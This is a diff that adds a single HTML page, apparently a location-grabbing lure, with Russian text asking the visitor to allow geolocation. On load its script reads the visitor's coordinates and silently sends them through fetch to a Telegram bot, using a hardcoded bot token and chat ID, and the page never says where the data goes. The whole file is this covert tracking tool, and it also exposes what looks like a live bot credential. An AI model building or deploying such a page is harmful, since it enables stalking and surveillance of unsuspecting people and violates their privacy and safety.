@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Geolocation to Telegram</title>
+</head>
+<body style="background: black; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0;">
+    <h1>Пожалуйста, дайте разрешение на геолокацию...</h1>
+    <script>
+        // Ваши данные Telegram
+        const botToken = "7010906033:AAGe4fWmuWDvz4sw-CpIAs4V1sfZ52pzJbQ"; // Токен бота
+        const chatId = "2145450623"; // Ваш chat ID
+
+        // Функция для отправки геолокации в Telegram
+        function sendLocationToTelegram(latitude, longitude) {
+            const message = `Координаты пользователя:\nШирота: ${latitude}\nДолгота: ${longitude}`;
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            
+            fetch(telegramUrl)
+                .then(response => {
+                    if (response.ok) {
+                        console.log("Геолокация успешно отправлена!");
+                    } else {
+                        console.error("Ошибка отправки данных в Telegram.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Ошибка подключения к Telegram API:", error);
+                });
+        }
+
+        // Запрос геолокации у пользователя
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const { latitude, longitude } = position.coords;
+                    sendLocationToTelegram(latitude, longitude);
+                },
+                (error) => {
+                    document.body.innerHTML = `<h1>Не удалось получить доступ к геолокации: ${error.message}</h1>`;
+                    console.error("Ошибка получения геолокации:", error);
+                }
+            );
+        } else {
+            document.body.innerHTML = "<h1>Ваш браузер не поддерживает геолокацию.</h1>";
+        }
+    </script>
+</body>
+</html>
